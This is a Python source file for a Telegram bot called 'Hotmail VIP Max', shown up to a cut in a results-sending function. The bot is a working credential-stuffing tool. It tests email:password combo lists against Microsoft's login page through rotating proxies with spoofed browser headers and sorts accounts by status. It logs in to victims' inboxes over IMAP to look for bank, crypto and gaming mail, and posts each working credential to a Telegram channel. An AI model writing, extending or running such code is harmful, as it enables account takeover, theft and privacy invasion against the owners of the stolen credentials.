# ============================================================
# Hotmail VIP Max — Full Upgraded Build
# Features: Real IMAP Inbox Scanner • Live Progress + ETA
#           Per-User Job Isolation • Auto-Zip Results
#           Auto-Retry Error Queue • Hits Channel Auto-Post
# ============================================================

import asyncio
import aiohttp
import imaplib
import email as email_lib
import re
import os
import json
import time
import random
import zipfile
import io
from datetime import datetime
from pathlib import Path
from collections import defaultdict
from typing import Optional, List, Dict, Tuple, Set

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, BufferedInputFile,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.enums import ParseMode
import logging

# ==================== CONFIG ====================
BOT_TOKEN: str = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN env var not set!")

_admin_env = os.environ.get("ADMIN_IDS", "")
ADMIN_IDS: List[int] = [int(x.strip()) for x in _admin_env.split(",") if x.strip().isdigit()]

# Feature 9: Hits auto-post channel
# Set HITS_CHANNEL_ID in Railway env vars (e.g. -100xxxxxxxxxx or @yourchannel)
HITS_CHANNEL_ID: str = os.environ.get("HITS_CHANNEL_ID", "")

DEFAULT_THREADS   = {"hotmail": 35, "inboxer": 15}
MAX_LOG_SIZE_MB   = 20        # Telegram bot API hard cap
PROGRESS_INTERVAL = 12        # seconds between live progress edits
RETRY_DELAY       = 2.0       # seconds between retries on error queue
IMAP_HOST         = "imap-mail.outlook.com"
IMAP_PORT         = 993
IMAP_SCAN_LIMIT   = 50        # max emails to scan per inbox

PROXY_FILE     = "proxies.txt"
SETTINGS_FILE  = "settings.json"
RESULTS_DIR    = Path("results")
CHECKPOINT_DIR = Path("checkpoints")
RESULTS_DIR.mkdir(exist_ok=True)
CHECKPOINT_DIR.mkdir(exist_ok=True)

HOTMAIL_DOMAINS: Set[str] = {
    "hotmail.com","hotmail.co.uk","hotmail.fr","hotmail.de","hotmail.it",
    "hotmail.es","hotmail.ca","hotmail.com.br","hotmail.com.ar","hotmail.com.mx",
    "hotmail.nl","hotmail.be","hotmail.se","hotmail.no","hotmail.dk",
    "hotmail.fi","hotmail.co.jp","hotmail.com.au","hotmail.co.nz","hotmail.co.th",
    "hotmail.com.tr","hotmail.com.hk","hotmail.sg","hotmail.my","hotmail.ph",
    "hotmail.co.id","hotmail.in","hotmail.cl","hotmail.com.pe","hotmail.com.co",
    "outlook.com","outlook.co.uk","outlook.fr","outlook.de","outlook.it",
    "outlook.es","outlook.ca","outlook.com.br","outlook.com.ar","outlook.com.mx",
    "outlook.jp","outlook.kr","outlook.sa","outlook.ae","outlook.cl",
    "live.com","live.co.uk","live.fr","live.de","live.it","live.nl",
    "live.com.ar","live.com.mx","live.com.au","live.ca","live.jp",
    "msn.com","msn.co.uk","windowslive.com","passport.com",
}

KEYWORDS: Dict[str, List[str]] = {
    "steam":      ["steam","steampowered"],
    "netflix":    ["netflix"],
    "paypal":     ["paypal"],
    "bank":       ["bank","chase","wellsfargo","citi","hsbc"],
    "crypto":     ["binance","coinbase","kraken"],
    "amazon":     ["amazon"],
    "microsoft":  ["microsoft","office365","xbox"],
    "facebook":   ["facebook","instagram"],
    "uber":       ["uber"],
    "spotify":    ["spotify"],
    "disney":     ["disney"],
    "hbo":        ["hbo"],
    "apple":      ["apple","icloud"],
    "google":     ["google","gmail"],
    "twitter":    ["twitter","x.com"],
    "tiktok":     ["tiktok"],
    "garena":     ["garena","codm"],
    "activision": ["activision","callofduty","warzone"],
    "riot":       ["riot","valorant"],
    "epic":       ["epicgames","fortnite"],
    "ea":         ["ea.com","origin"],
    "ubisoft":    ["ubisoft"],
    "rockstar":   ["rockstar"],
    "battlenet":  ["battle.net"],
    "sony":       ["playstation","psn"],
    "xbox":       ["xbox"],
    "nintendo":   ["nintendo"],
    "twitch":     ["twitch"],
    "discord":    ["discord"],
}

COUNTRY_FLAGS: Dict[str, str] = {
    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
    "IT":"🇮🇹","ES":"🇪🇸","BR":"🇧🇧","MX":"🇲🇽","AR":"🇦🇷","IN":"🇮🇳",
    "PK":"🇵🇰","PH":"🇵🇭","ID":"🇮🇩","TR":"🇹🇷","RU":"🇷🇺","NL":"🇳🇱",
    "JP":"🇯🇵","KR":"🇰🇷","SG":"🇸🇬","AE":"🇦🇪","SA":"🇸🇦","NG":"🇳🇬",
}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("hotmail_max")

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

# ==================== SETTINGS ====================
def load_settings() -> Dict:
    if Path(SETTINGS_FILE).exists():
        try:
            return json.loads(Path(SETTINGS_FILE).read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"threads_hotmail": 35, "threads_inboxer": 15}

def save_settings(data: Dict) -> None:
    Path(SETTINGS_FILE).write_text(json.dumps(data, indent=2), encoding="utf-8")

settings = load_settings()

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    @staticmethod
    def _normalize(p: str) -> str:
        if not p.startswith(("http://","https://","socks5://","socks4://")):
            return "http://" + p
        return p

    @staticmethod
    def _default_meta() -> Dict:
        return {"score": 100, "fails": 0, "last_fail": 0.0, "success": 0, "alive": None}

    def load(self, path: str = PROXY_FILE) -> int:
        if not os.path.exists(path):
            return 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                p = line.strip()
                if not p:
                    continue
                p = self._normalize(p)
                if p not in self.proxies:
                    self.proxies[p] = self._default_meta()
        return len(self.proxies)

    def save(self, path: str = PROXY_FILE) -> None:
        with open(path, "w", encoding="utf-8") as f:
            for p in self.proxies:
                f.write(p + "\n")

    async def get(self) -> Optional[str]:
        async with self.lock:
            now = time.time()
            candidates = []
            for p, m in self.proxies.items():
                if m.get("alive") is False:
                    continue
                if m["fails"] >= 5 and (now - m["last_fail"]) < 600:
                    continue
                candidates.append((m["score"], p))
            if not candidates:
                return random.choice(list(self.proxies)) if self.proxies else None
            candidates.sort(reverse=True)
            top = candidates[:max(10, len(candidates) // 3)]
            return random.choice(top)[1]

    async def mark_success(self, proxy: Optional[str]) -> None:
        if not proxy:
            return
        async with self.lock:
            if proxy in self.proxies:
                m = self.proxies[proxy]
                m["score"]   = min(200, m["score"] + 2)
                m["success"] += 1
                m["fails"]   = max(0, m["fails"] - 1)
                m["alive"]   = True

    async def mark_fail(self, proxy: Optional[str]) -> None:
        if not proxy:
            return
        async with self.lock:
            if proxy in self.proxies:
                m = self.proxies[proxy]
                m["score"]     = max(0, m["score"] - 15)
                m["fails"]     += 1
                m["last_fail"] = time.time()

    def count(self) -> int:
        return len(self.proxies)

    def clear(self) -> None:
        self.proxies.clear()

    def add_list(self, lines: List[str]) -> None:
        for raw in lines:
            p = raw.strip()
            if not p:
                continue
            p = self._normalize(p)
            if p not in self.proxies:
                self.proxies[p] = self._default_meta()
        self.save()

proxy_mgr = ProxyManager()

# ==================== STATES ====================
class Form(StatesGroup):
    waiting_combo       = State()
    waiting_proxy       = State()
    waiting_ulp         = State()
    waiting_threads     = State()
    waiting_proxy_check = State()
    waiting_combo_tool  = State()
    waiting_split_count = State()

# ==================== GLOBALS ====================
user_stats: Dict[int, Dict] = defaultdict(lambda: {
    "checked": 0, "hits": 0, "bad": 0, "twofa": 0, "custom": 0,
    "cpm": 0.0, "start_time": 0.0, "running": False, "mode": "",
    "total": 0, "retried": 0,
})
active_tasks: Dict[int, asyncio.Task] = {}

# Feature 3: Per-user dedupe sets (replaces global seen_emails)
user_seen: Dict[int, Set[str]] = defaultdict(set)

# ==================== UTILS ====================
def is_hotmail_family(email: str) -> bool:
    if "@" not in email:
        return False
    return email.lower().split("@")[-1] in HOTMAIL_DOMAINS

def parse_combo(line: str) -> Optional[Tuple[str, str]]:
    line = line.strip()
    if ":" not in line:
        return None
    user, _, pwd = line.partition(":")
    user, pwd = user.strip(), pwd.strip()
    if not user or not pwd or "@" not in user:
        return None
    return user, pwd

_DOMAIN_COUNTRY: Dict[str, str] = {}
def _build_domain_country():
    mapping = [
        (["hotmail.co.uk","outlook.co.uk","live.co.uk","msn.co.uk"], "GB"),
        (["hotmail.ca","outlook.ca","live.ca"], "CA"),
        (["hotmail.com.au","live.com.au"], "AU"),
        (["hotmail.com.br","outlook.com.br","live.com.br"], "BR"),
        (["hotmail.com.mx","outlook.com.mx","live.com.mx"], "MX"),
        (["hotmail.com.ar","outlook.com.ar","live.com.ar"], "AR"),
        (["hotmail.de","outlook.de"], "DE"),
        (["hotmail.fr","outlook.fr"], "FR"),
        (["hotmail.es","outlook.es"], "ES"),
        (["hotmail.it","outlook.it"], "IT"),
        (["hotmail.nl","live.nl"], "NL"),
        (["hotmail.in"], "IN"),
        (["hotmail.com.tr"], "TR"),
        (["hotmail.co.jp","live.jp","outlook.jp"], "JP"),
        (["hotmail.sg"], "SG"),
        (["hotmail.ph"], "PH"),
        (["hotmail.co.id"], "ID"),
        (["outlook.kr"], "KR"),
        (["outlook.sa"], "SA"),
        (["outlook.ae"], "AE"),
        (["hotmail.cl","outlook.cl"], "CL"),
    ]
    for domains, cc in mapping:
        for d in domains:
            _DOMAIN_COUNTRY[d] = cc
_build_domain_country()

def detect_country(email: str) -> str:
    domain = email.lower().split("@")[-1] if "@" in email else ""
    return _DOMAIN_COUNTRY.get(domain, "US")

def count_lines_fast(path: str) -> int:
    """Fast line counter using binary read."""
    count = 0
    with open(path, "rb") as f:
        for _ in f:
            count += 1
    return count

def fmt_eta(minutes: float) -> str:
    if minutes < 1:
        return "<1m"
    if minutes < 60:
        return f"{int(minutes)}m"
    h = int(minutes // 60)
    m = int(minutes % 60)
    return f"{h}h {m}m"

# ==================== FEATURE 1: REAL IMAP INBOX SCANNER ====================
def _imap_scan_sync(email_addr: str, password: str) -> List[str]:
    """
    Sync IMAP scan — runs in thread executor so it doesn't block the event loop.
    Tries to login via IMAP and scan subject lines for keyword matches.
    Note: Microsoft deprecated basic auth IMAP for most consumer accounts (Oct 2022).
    Newer accounts may not support this — function gracefully returns [] on failure.
    """
    matched: List[str] = []
    try:
        mail = imaplib.IMAP4_SSL(IMAP_HOST, IMAP_PORT)
        mail.login(email_addr, password)
        mail.select("INBOX", readonly=True)
        _, data = mail.search(None, "ALL")
        ids = data[0].split() if data and data[0] else []
        # Scan last N emails only (most recent = most valuable)
        sample = ids[-IMAP_SCAN_LIMIT:] if len(ids) > IMAP_SCAN_LIMIT else ids
        for num in sample:
            _, msg_data = mail.fetch(num, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM)])")
            if not msg_data or not msg_data[0]:
                continue
            raw = msg_data[0][1] if isinstance(msg_data[0], tuple) else b""
            decoded = raw.decode("utf-8", errors="ignore").lower()
            for kw_name, kw_list in KEYWORDS.items():
                if kw_name not in matched and any(k in decoded for k in kw_list):
                    matched.append(kw_name)
        try:
            mail.close()
            mail.logout()
        except Exception:
            pass
    except imaplib.IMAP4.error:
        pass  # Bad credentials or IMAP disabled — silent
    except Exception as e:
        log.debug(f"IMAP scan failed for {email_addr}: {e}")
    return matched

async def scan_inbox_keywords(email_addr: str, password: str) -> List[str]:
    """Async wrapper — runs IMAP scan in thread pool."""
    loop = asyncio.get_event_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(None, _imap_scan_sync, email_addr, password),
            timeout=15.0
        )
    except asyncio.TimeoutError:
        return []
    except Exception:
        return []

# ==================== FEATURE 9: HITS CHANNEL AUTO-POST ====================
async def post_hit_to_channel(
    email: str,
    pwd: str,
    status: str,
    country: str,
    matched_kws: List[str],
) -> None:
    """Post a real-time hit notification to the configured Telegram channel."""
    if not HITS_CHANNEL_ID:
        return
    flag     = COUNTRY_FLAGS.get(country, "🌐")
    icon     = "✅" if status == "valid" else "💎"
    kw_str   = " ".join(f"#{k}" for k in matched_kws) if matched_kws else "—"
    now_str  = datetime.now().strftime("%H:%M:%S")
    text = (
        f"{icon} <b>HIT [{now_str}]</b>\n"
        f"<code>{email}:{pwd}</code>\n"
        f"{flag} <b>{country}</b>  |  Status: <b>{status.upper()}</b>\n"
        f"🔑 Keywords: {kw_str}"
    )
    try:
        await bot.send_message(HITS_CHANNEL_ID, text, parse_mode=ParseMode.HTML)
    except Exception as e:
        log.warning(f"Channel post failed: {e}")

# ==================== HIGH ACCURACY LOGIN ====================
_CHROME_VERSIONS = ["139.0.0.0", "138.0.0.0", "137.0.0.0", "136.0.0.0"]

async def hotmail_login_v2(
    connector: aiohttp.TCPConnector,
    email: str,
    password: str,
    proxy: Optional[str] = None,
) -> Dict:
    result: Dict = {"status": "error", "cookies": {}, "info": "", "country": detect_country(email)}
    ver   = random.choice(_CHROME_VERSIONS)
    major = ver.split(".")[0]
    ua    = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             f"(KHTML, like Gecko) Chrome/{ver} Safari/537.36")
    headers = {
        "User-Agent":                ua,
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":           random.choice(["en-US,en;q=0.9","en-GB,en;q=0.9"]),
        "Accept-Encoding":           "gzip, deflate, br",
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-User":            "?1",
        "Sec-Fetch-Dest":            "document",
        "Sec-Ch-Ua":                 f'"Chromium";v="{major}", "Not;A=Brand";v="99"',
        "Sec-Ch-Ua-Mobile":          "?0",
        "Sec-Ch-Ua-Platform":        '"Windows"',
    }
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, cookie_jar=jar) as session:
        for attempt in range(3):
            try:
                async with session.get(
                    "https://login.live.com/", headers=headers, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=18), ssl=False, allow_redirects=True,
                ) as r:
                    if r.status == 429:
                        await proxy_mgr.mark_fail(proxy)
                        await asyncio.sleep(2 + attempt * 2)
                        continue
                    text = await r.text()
                    cookies = {c.key: c.value for c in session.cookie_jar}

                ppft = None
                for pat in [
                    r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',
                    r'name="PPFT"[^>]*value="([^"]+)"',
                    r'"sFTTag":"<input type=\\"hidden\\" name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',
                    r'PPFT" value="([^"]+)"',
                ]:
                    m = re.search(pat, text)
                    if m:
                        ppft = m.group(1)
                        break
                if not ppft:
                    if attempt < 2:
                        await asyncio.sleep(1)
                        continue
                    result.update({"status": "error", "info": "PPFT missing"})
                    return result

                opid      = re.search(r'opid%3D([^%&"]+)', text) or re.search(r'opid=([^&"]+)', text)
                contextid = re.search(r'contextid%3D([^%&"]+)', text) or re.search(r'contextid=([^&"]+)', text)
                uaid      = cookies.get("uaid", "")
                if not uaid:
                    mu = re.search(r'uaid=([a-f0-9-]+)', text)
                    if mu:
                        uaid = mu.group(1)
                bk = ""
                msp = cookies.get("MSPRequ", "")
                if msp:
                    mb = re.search(r'lt=([^&]+)', msp)
                    if mb:
                        bk = mb.group(1)

                post_url = (
                    f"https://login.live.com/ppsecure/post.srf"
                    f"?contextid={contextid.group(1) if contextid else ''}"
                    f"&opid={opid.group(1) if opid else ''}"
                    f"&bk={bk}&uaid={uaid}&pid=0"
                )
                payload = {
                    "ps":"2","PPFT":ppft,"PPSX":"Pass","NewUser":"1",
                    "login":email,"loginfmt":email,"type":"11","LoginOptions":"3","passwd":password,
                    "psRNGCDefaultType":"","psRNGCEntropy":"","psRNGCSLK":"","canary":"","ctx":"",
                    "hpgrequestid":"","FoundMSAs":"","fspost":"0","i21":"0","CookieDisclosure":"0",
                    "IsFidoSupported":"1","isSignupPost":"0","isRecoveryAttemptPost":"0","i13":"0",
                    "lrt":"","lrtPartition":"","hisRegion":"","hisScaleUnit":"",
                }
                h2 = {**headers,
                      "Content-Type":"application/x-www-form-urlencoded",
                      "Origin":"https://login.live.com",
                      "Referer":"https://login.live.com/",
                      "Sec-Fetch-Site":"same-origin"}

                async with session.post(
                    post_url, data=payload, headers=h2, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=22), ssl=False, allow_redirects=True,
                ) as r2:
                    if r2.status == 429:
                        await proxy_mgr.mark_fail(proxy)
                        await asyncio.sleep(3)
                        continue
                    text2     = await r2.text()
                    final_url = str(r2.url)
                    cookies2  = {c.key: c.value for c in session.cookie_jar}

                text2_l = text2.lower()
                furl_l  = final_url.lower()

                if any(x in text2 for x in [
                    "Your account or password is incorrect",
                    "That Microsoft account doesn't exist",
                    "Sign in to your Microsoft account",
                    "We couldn't find an account",
                ]):
                    await proxy_mgr.mark_success(proxy)
                    result["status"] = "bad"
                    return result
                if any(x in text2_l or x in furl_l for x in [
                    "account.live.com/recover","recover?mkt","identity/confirm",
                    "email/confirm","proofs/add",
                ]):
                    await proxy_mgr.mark_success(proxy)
                    result.update({"status": "2fa", "cookies": cookies2})
                    return result
                if any(x in text2 or x in final_url for x in ["/cancel?mkt=","/Abuse?mkt=","locked"]):
                    await proxy_mgr.mark_success(proxy)
                    result["status"] = "custom"
                    return result
                cookies2_str = str(cookies2)
                if any(k in cookies2_str or k in text2 or k in final_url for k in [
                    "ANON","JSHP","JSH","WLSSC","sSigninName",
                    "oauth20_desktop.srf","account.microsoft.com",
                ]):
                    await proxy_mgr.mark_success(proxy)
                    result.update({"status": "valid", "cookies": cookies2})
                    return result
                if "login.live.com" not in final_url and "account.live.com" not in final_url:
                    await proxy_mgr.mark_success(proxy)
                    result.update({"status": "valid", "cookies": cookies2})
                    return result
                await proxy_mgr.mark_success(proxy)
                result["status"] = "bad"
                return result

            except asyncio.TimeoutError:
                await proxy_mgr.mark_fail(proxy)
                if attempt < 2:
                    await asyncio.sleep(1.5)
                    continue
                result.update({"status": "error", "info": "timeout"})
                return result
            except Exception as e:
                await proxy_mgr.mark_fail(proxy)
                if attempt < 2:
                    await asyncio.sleep(1)
                    continue
                result.update({"status": "error", "info": str(e)[:80]})
                return result
    return result

# ==================== PROXY CHECKER ====================
async def check_one_proxy(proxy: str, timeout: int = 10) -> Dict:
    result = {
        "proxy":    proxy,
        "alive":    False,
        "ping":     None,
        "protocol": "socks5" if proxy.startswith("socks5://")
                    else "socks4" if proxy.startswith("socks4://")
                    else "https" if proxy.startswith("https://")
                    else "http",
    }
    try:
        start = time.time()
        async with aiohttp.ClientSession() as s:
            async with s.get(
                "http://httpbin.org/ip", proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=timeout), ssl=False,
            ) as r:
                if r.status == 200:
                    result["alive"] = True
                    result["ping"]  = int((time.time() - start) * 1000)
    except Exception:
        pass
    return result

async def proxy_checker_worker(proxies: List[str], threads: int = 30) -> Tuple[List, List]:
    sem   = asyncio.Semaphore(threads)
    alive: List[Dict] = []
    dead:  List[Dict] = []
    async def one(p: str):
        async with sem:
            res = await check_one_proxy(p)
            (alive if res["alive"] else dead).append(res)
    await asyncio.gather(*[one(p) for p in proxies])
    return alive, dead

# ==================== ULP / LOG EXTRACTOR ====================
def extract_ulp_to_combo(content: str) -> Dict[str, List[str]]:
    services  = list(KEYWORDS.keys()) + ["hotmail","outlook","live","msn","microsoft"]
    results: Dict[str, List[str]] = defaultdict(list)
    email_re  = re.compile(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)\s*[:|]\s*([^\s:|]+)')
    for line in content.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        lower   = line.lower()
        matched = next((s for s in services if s in lower), None)
        if not matched and any(x in lower for x in ["hotmail","outlook","live.com","msn.com"]):
            matched = "hotmail"
        m = email_re.search(line)
        if m:
            ep = f"{m.group(1)}:{m.group(2)}"
        else:
            parts = line.split(":")
            if len(parts) >= 2:
                pe, pp = parts[-2].strip(), parts[-1].strip()
                if "@" in pe and "." in pe:
                    ep = f"{pe}:{pp}"
                else:
                    continue
            else:
                continue
        results[matched or "unknown"].append(ep)
    return {k: list(dict.fromkeys(v)) for k, v in results.items()}

# ==================== COMBO TOOLS ====================
def combo_dedupe(lines: List[str]) -> List[str]:
    seen: Set[str] = set()
    out: List[str] = []
    for l in lines:
        key = l.strip().lower()
        if key and key not in seen:
            seen.add(key)
            out.append(l.strip())
    return out

def combo_split(lines: List[str], parts: int) -> List[List[str]]:
    if parts < 2:
        return [lines]
    size = (len(lines) + parts - 1) // parts
    return [lines[i:i+size] for i in range(0, len(lines), size)]

def combo_merge(lol: List[List[str]]) -> List[str]:
    merged: List[str] = []
    for lst in lol:
        merged.extend(lst)
    return combo_dedupe(merged)

def combo_convert(lines: List[str], mode: str) -> List[str]:
    out: List[str] = []
    email_re = re.compile(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)\s*[:|]\s*([^\s:|]+)')
    for l in lines:
        l = l.strip()
        if not l:
            continue
        if mode == "email_only":
            m = email_re.search(l)
            if m:
                out.append(m.group(1))
        elif mode == "user_only":
            if ":" in l:
                out.append(l.split(":")[0].strip())
        elif mode == "full_to_combo":
            m = email_re.search(l)
            if m:
                out.append(f"{m.group(1)}:{m.group(2)}")
            elif l.count(":") >= 1:
                parts = l.rsplit(":", 1)
                if "@" in parts[0]:
                    out.append(f"{parts[0].strip()}:{parts[1].strip()}")
    return list(dict.fromkeys(out))

# ==================== FEATURE 2+6: LIVE PROGRESS UPDATER ====================
async def live_progress_task(status_msg: Message, stats: Dict, total: int) -> None:
    """
    Background task: edits the status message every PROGRESS_INTERVAL seconds
    with live stats + ETA. Stops when stats["running"] becomes False.
    """
    while stats["running"]:
        await asyncio.sleep(PROGRESS_INTERVAL)
        if not stats["running"]:
            break
        checked  = stats["checked"]
        cpm      = max(stats["cpm"], 1)
        remaining = max(total - checked, 0)
        eta_min  = remaining / cpm
        pct      = int(checked / max(total, 1) * 100)
        bar_fill = int(pct / 10)
        bar      = "█" * bar_fill + "░" * (10 - bar_fill)
        text = (
            f"🔄 <b>{stats['mode'].upper()}</b> Running\n"
            f"[{bar}] {pct}%\n\n"
            f"📊 Checked: <b>{checked}</b> / {total}\n"
            f"✅ Valid: <b>{stats['hits']}</b>  |  "
            f"💎 2FA: <b>{stats['twofa']}</b>\n"
            f"⚠️ Custom: <b>{stats['custom']}</b>  |  "
            f"❌ Bad: <b>{stats['bad']}</b>\n"
            f"🔁 Retried: <b>{stats.get('retried', 0)}</b>\n\n"
            f"⚡ CPM: <b>{int(cpm)}</b>  |  ⏱ ETA: <b>{fmt_eta(eta_min)}</b>\n"
            f"🌐 Proxies: <b>{proxy_mgr.count()}</b>"
        )
        try:
            await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
        except Exception:
            pass  # Flood wait or message not modified — ignore

# ==================== STREAMING WORKER ====================
async def stream_check(
    uid:         int,
    file_path:   str,
    threads:     int,
    mode:        str,
    status_msg:  Message,
    resume_from: int = 0,
) -> Dict:
    stats = user_stats[uid]

    # Feature 3: count total lines first for progress % and ETA
    total = count_lines_fast(file_path)
    stats.update({
        "running": True, "start_time": time.time(),
        "checked": 0, "hits": 0, "bad": 0,
        "twofa": 0, "custom": 0, "cpm": 0.0,
        "mode": mode, "total": total, "retried": 0,
    })

    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = RESULTS_DIR / str(uid) / ts
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "Countries").mkdir(exist_ok=True)
    (out_dir / "Keywords").mkdir(exist_ok=True)

    ckpt_file  = CHECKPOINT_DIR / f"{uid}_last.txt"
    processed  = resume_from
    seen       = user_seen[uid]          # Feature 3: per-user set
    error_queue: List[str] = []          # Feature 7: lines to retry

    valid_f  = open(out_dir / "Valid.txt",  "a", encoding="utf-8")
    twofa_f  = open(out_dir / "2FA.txt",   "a", encoding="utf-8")
    custom_f = open(out_dir / "Custom.txt","a", encoding="utf-8")
    hits_f   = open(out_dir / "hits.txt",  "a", encoding="utf-8")
    country_files: Dict[str, "io.TextIOWrapper"] = {}
    keyword_files: Dict[str, "io.TextIOWrapper"] = {}

    connector = aiohttp.TCPConnector(
        limit=threads * 2, ssl=False,
        ttl_dns_cache=60, enable_cleanup_closed=True,
    )

    # Feature 2+6: start live progress updater
    progress_t = asyncio.create_task(live_progress_task(status_msg, stats, total))

    try:
        sem = asyncio.Semaphore(threads)

        async def handle_hit(email: str, pwd: str, res: Dict, line_out: str):
            """Shared logic for writing a hit (valid or 2FA), incl. IMAP scan + channel post."""
            cc   = res["country"]
            stat = res["status"]

            # Write to result files
            if stat == "valid":
                stats["hits"] += 1
                valid_f.write(line_out + "\n"); valid_f.flush()
                hits_f.write(line_out  + "\n"); hits_f.flush()
            elif stat == "2fa":
                stats["twofa"] += 1
                twofa_f.write(line_out + "\n"); twofa_f.flush()
                hits_f.write(line_out  + "\n"); hits_f.flush()
            elif stat == "custom":
                stats["custom"] += 1
                custom_f.write(line_out + "\n"); custom_f.flush()

            # Country file
            if stat in ("valid", "2fa") and cc:
                if cc not in country_files:
                    country_files[cc] = open(out_dir / "Countries" / f"{cc}.txt", "a", encoding="utf-8")
                country_files[cc].write(line_out + "\n")
                country_files[cc].flush()

            # Feature 1: Real IMAP inbox scan for inboxer mode
            matched_kws: List[str] = []
            if mode == "inboxer" and stat == "valid":
                matched_kws = await scan_inbox_keywords(email, pwd)
                if matched_kws:
                    for kw in matched_kws:
                        if kw not in keyword_files:
                            keyword_files[kw] = open(out_dir / "Keywords" / f"{kw}.txt", "a", encoding="utf-8")
                        keyword_files[kw].write(line_out + "\n")
                        keyword_files[kw].flush()

            # Feature 9: Post to hits channel
            if stat in ("valid", "2fa"):
                await post_hit_to_channel(email, pwd, stat, cc, matched_kws)

        async def process_line(line: str, line_no: int):
            nonlocal processed
            async with sem:
                if not stats["running"]:
                    return
                parsed = parse_combo(line)
                if not parsed:
                    stats["bad"]     += 1
                    stats["checked"] += 1
                    return
                email, pwd = parsed
                email_l    = email.lower()
                if email_l in seen:
                    stats["checked"] += 1
                    return
                seen.add(email_l)
                if not is_hotmail_family(email):
                    stats["bad"]     += 1
                    stats["checked"] += 1
                    return
                proxy = await proxy_mgr.get()
                res   = await hotmail_login_v2(connector, email, pwd, proxy)
                stats["checked"] += 1
                processed = line_no
                line_out  = f"{email}:{pwd}"

                if res["status"] in ("valid", "2fa", "custom"):
                    await handle_hit(email, pwd, res, line_out)
                elif res["status"] == "error":
                    # Feature 7: queue for retry instead of counting as bad
                    error_queue.append(line)
                else:
                    stats["bad"] += 1

                elapsed  = max(time.time() - stats["start_time"], 1)
                stats["cpm"] = int(stats["checked"] / elapsed * 60)
                if stats["checked"] % 5000 == 0:
                    ckpt_file.write_text(str(processed), encoding="utf-8")
                    log.info(f"[{uid}] {stats['checked']}/{total} | CPM {stats['cpm']} | Hits {stats['hits']}")

        # ── Main pass ──────────────────────────────────────────────────────
        batch: List[Tuple[str, int]] = []
        line_no = 0
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for raw in f:
                line_no += 1
                if line_no <= resume_from:
                    continue
                if not stats["running"]:
                    break
                batch.append((raw.strip(), line_no))
                if len(batch) >= 150:
                    await asyncio.gather(*[process_line(l, n) for l, n in batch])
                    batch = []
            if batch:
                await asyncio.gather(*[process_line(l, n) for l, n in batch])

        # ── Feature 7: Retry error queue ──────────────────────────────────
        if error_queue and stats["running"]:
            log.info(f"[{uid}] Retrying {len(error_queue)} errored lines...")
            retry_sem = asyncio.Semaphore(max(threads // 2, 5))

            async def retry_line(line: str):
                async with retry_sem:
                    if not stats["running"]:
                        return
                    parsed = parse_combo(line)
                    if not parsed:
                        return
                    email, pwd = parsed
                    await asyncio.sleep(RETRY_DELAY)
                    proxy = await proxy_mgr.get()
                    res   = await hotmail_login_v2(connector, email, pwd, proxy)
                    stats["retried"] += 1
                    line_out = f"{email}:{pwd}"
                    if res["status"] in ("valid", "2fa", "custom"):
                        await handle_hit(email, pwd, res, line_out)
                    else:
                        stats["bad"] += 1

            await asyncio.gather(*[retry_line(l) for l in error_queue])

    finally:
        progress_t.cancel()
        for fh in [valid_f, twofa_f, custom_f, hits_f]:
            fh.close()
        for fh in list(country_files.values()) + list(keyword_files.values()):
            fh.close()
        await connector.close()
        ckpt_file.write_text(str(processed), encoding="utf-8")
        stats["running"] = False

    # HTML summary
    html = (
        f'<html><body style="background:#0d0d0d;color:#00ff9d;font-family:monospace;padding:20px">'
        f"<h1>Hotmail VIP Max — {ts}</h1>"
        f"<p>Checked: {stats['checked']} | Valid: {stats['hits']} | "
        f"2FA: {stats['twofa']} | Custom: {stats['custom']} | "
        f"Bad: {stats['bad']} | Retried: {stats.get('retried',0)}</p>"
        f"<p>CPM: {stats['cpm']} | Mode: {mode}</p>"
        f"</body></html>"
    )
    (out_dir / "Inbox_Results.html").write_text(html, encoding="utf-8")
    return {"dir": out_dir, "stats": dict(stats)}

# ==================== FEATURE 5: AUTO-ZIP ALL RESULTS ====================
async def send_results(msg: Message, out_dir: Path, stats: Dict) -> None:
    """
    Send individual result files first, then bundle everything
    into one master zip for easy download.
    """
    sent_files: List[Path] = []

    # Send individual files
    for name, cap in [
        ("Valid.txt",         "✅ Valid"),
        ("2FA.txt",           "💎 2FA"),
        ("hits.txt",          "⚙ All Hits"),
